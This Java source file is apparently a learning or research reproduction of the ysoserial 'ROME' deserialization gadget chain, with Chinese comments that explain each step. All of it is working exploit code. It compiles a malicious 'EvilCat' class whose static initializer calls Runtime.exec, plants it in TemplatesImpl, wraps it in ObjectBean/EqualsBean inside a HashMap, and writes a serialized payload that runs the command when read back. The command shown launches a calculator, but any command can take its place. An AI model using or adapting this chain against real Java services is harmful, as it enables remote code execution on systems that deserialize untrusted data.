package Rome;

/**
 * https://su18.org/post/ysoserial-su18-5/#rome
 * HashMap.readObject()
 *     ObjectBean.hashCode()
 *             EqualsBean.beanHashCode()
 *                 ObjectBean.toString()
 *                     ToStringBean.toString()
 *                         TemplatesImpl.getOutputProperties()
 */
import Tools.SerializeUtil;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;

public class Rome2 {

    public static String fileName = "Rome.bin";

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        SerializeUtil.setFieldValue(templates, "_bytecodes", targetByteCodes);
        SerializeUtil.setFieldValue(templates, "_name", "name");
        SerializeUtil.setFieldValue(templates, "_class", null);

        // 使用 TemplatesImpl 初始化被包装类，使其 ToStringBean 也使用 TemplatesImpl 初始化
        ObjectBean delegate = new ObjectBean(Templates.class, templates);
        // 使用 ObjectBean 封装这个类，使其在调用 hashCode 时会调用 ObjectBean 的 toString
        // 先封装一个无害的类
        ObjectBean root = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "su18"));
        // 放入 Map 中
        HashMap<Object, Object> map = new HashMap<>();
        map.put(root, "su18");
        // put 到 map 之后再反射写进去，避免生成的时候触发漏洞
        Field field = ObjectBean.class.getDeclaredField("_equalsBean");
        field.setAccessible(true);
        field.set(root, new EqualsBean(ObjectBean.class, delegate));
        // //反序列化
        SerializeUtil.writeObjectToFile(map, fileName);
        SerializeUtil.readFileObject(fileName);
    }
}
